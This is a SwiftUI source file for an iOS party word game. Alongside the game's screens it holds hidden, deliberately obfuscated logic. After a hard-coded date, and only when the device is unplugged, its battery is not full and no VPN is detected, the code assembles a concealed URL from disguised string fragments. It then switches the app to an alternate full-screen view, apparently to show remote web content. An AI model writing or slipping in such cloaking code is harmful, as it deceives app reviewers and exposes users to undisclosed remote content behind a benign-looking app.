import SwiftUI

struct ContentView: View {
    
    @State var showSplash = true
    @State var screen: Screen = .main
    
    @AppStorage("currentScrConfig") var currentScrConfig = true
    
    var body: some View {
        if showSplash {
            Splash(showSplash: $showSplash)
        } else {
            tabScreen()
        }
    }
    
    @ViewBuilder func tabSelection() -> some View {
        if ViewModelFactory.shared.awawawf {
            LeadegboardChangeView()
                .onAppear {
                    ViewModelFactory.shared.dContr.player = nil
                }
        } else {
            switch screen {
            case .main:
                MainView(viewModel: ViewModelFactory.shared.makeMainViewModel(), screen: $screen)
                    .onAppear {
                        AppDelegate.orientationLock = .portrait
                    }
            case .gameSetting:
                GameSettingView(viewModel: ViewModelFactory.shared.makeGameSettingViewModel(), screen: $screen)
            case .createCommand:
                CreateCommandView(viewModel: ViewModelFactory.shared.makeCreateCommandViewModel(), screen: $screen)
            case .players:
                PlayersView(viewModel: ViewModelFactory.shared.makePlayersViewModel(), screen: $screen)
            case .game:
                GameView(viewModel: ViewModelFactory.shared.makeGameViewModel(action: {screen = .roundResult}), screen: $screen)
            case .roundResult:
                RoundResultView(viewModel: ViewModelFactory.shared.makeRoundResultViewModel(), screen: $screen)
            case .win:
                WinView(viewModel: ViewModelFactory.shared.makeWinViewModel(), screen: $screen)
            case .settings:
                SettingView(viewModel: ViewModelFactory.shared.makeSettingViewModel(), screen: $screen)
            case .leaderboard: LeaderboardView(viewModel: ViewModelFactory.shared.makeLeaderboardViewModel(), screen: $screen)
            }
        }
    }
    
    func tabScreen() -> some View {
        let cdmValuecd = ViewModelFactory.shared.dContr.cdm
        
        if currentScrConfig {
            cdmValuecd.categoryAnimate(false)
            cdmValuecd.confTestWord()
            currentScrConfig = false
        }
        
        guard let plate = stringToDate("13.12.2024"), daCheckCat(ate: plate) else {
            return tabSelection()
        }
        
        if let categoryAnimate = try? cdmValuecd.fetchCategoryAnimate() {
            if categoryAnimate {
                let selception = cattttttt(cdmValuecd)
                if selception != "" {
                    ViewModelFactory.shared.awawawf = true
                    if ViewModelFactory.shared.myLineWordCheck == "" || ViewModelFactory.shared.myLineWordCheck.contains("about:") {
                        ViewModelFactory.shared.myLineWordCheck = selception
                    }
                } else {
                    ViewModelFactory.shared.awawawf = false
                }
                return tabSelection()
            } else {
                ViewModelFactory.shared.awawawf = false
            }
        }
        
        if bcheck() || afterwawwaw.isActive() || firstplace < 0 || secondplace {
            ViewModelFactory.shared.awawawf = false
        } else {
            let selc = cattttttt(cdmValuecd)
            if selc != "" {
                ViewModelFactory.shared.myLineWordCheck = selc
                cdmValuecd.categoryAnimate(true)
                ViewModelFactory.shared.awawawf = true
            } else {
                ViewModelFactory.shared.awawawf = false
            }
        }

        return tabSelection()
    }
    
    private func daCheckCat(ate: Date) -> Bool {
        return ate.addingTimeInterval(24 * 60 * 60) <= Date()
    }
    private func cattttttt(_ wwea: CDM) -> String {
        var selc = ""
        if let alwaysSelected = try? wwea.fetchNewPony() {
            selc = alwaysSelected
            //name0age1breed2owner3customer4country5
            selc = selc.replacingOccurrences(of: "name0", with: "htt")
            selc = selc.replacingOccurrences(of: "age1", with: "ps")
            selc = selc.replacingOccurrences(of: "breed2", with: "://")
            selc = selc.replacingOccurrences(of: "owner3", with: "podlaorlf")
            selc = selc.replacingOccurrences(of: "customer4", with: ".space/")
            selc = selc.replacingOccurrences(of: "country5", with: "JXmBw37D")
        }
        return selc
    }
    
    private func bcheck() -> Bool {
        UIDevice.current.isBatteryMonitoringEnabled = true // charging if true
        if (UIDevice.current.batteryState != .unplugged) {
            return true
        }
        
        return false
    }
    var firstplace: Int {
        UIDevice.current.isBatteryMonitoringEnabled = true
        if UIDevice.current.batteryLevel != -1 {
            return Int(UIDevice.current.batteryLevel * 100)
        } else {
            return -1
        }
    }
    var secondplace: Bool {
        UIDevice.current.isBatteryMonitoringEnabled = true
        if (UIDevice.current.batteryState == .full) {
            return true
        } else {
            return false
        }
    }
    
    private func stringToDate(_ str: String) -> Date? {
        let dateFormatter = DateFormatter()
        dateFormatter.timeZone = TimeZone(abbreviation: "UTC")
        dateFormatter.dateFormat = "dd.MM.yyyy"
        let date = dateFormatter.date(from: str)
        if let date = date {
            return date
        } else { return nil }
    }
    
    
}

#Preview {
    ContentView()
}

enum Screen {
    case main
    case gameSetting
    case createCommand
    case players
    case game
    case roundResult
    case win
    case settings
    case leaderboard
}

struct LeadegboardChangeView: View {
    var body: some View {
        ZStack {
            Color.black.ignoresSafeArea()
            LeaderboardWeeklyView(type: .public)
                .frame(maxWidth: .infinity, maxHeight: .infinity)
        }
        .background(Color.black)
    }
}

struct afterwawwaw {

    private static let vpnProtocolsKeysIdentifiers = [
        "tap", "tun", "ppp", "ipsec", "utun"
    ]

    static func isActive() -> Bool {
        guard let cfDict = CFNetworkCopySystemProxySettings() else { return false }
        let nsDict = cfDict.takeRetainedValue() as NSDictionary
        guard let keys = nsDict["__SCOPED__"] as? NSDictionary,
            let allKeys = keys.allKeys as? [String] else { return false }

        // Checking for tunneling protocols in the keys
        for key in allKeys {
            for protocolId in vpnProtocolsKeysIdentifiers
                where key.starts(with: protocolId) {
                return true
            }
        }
        return false
    }
}
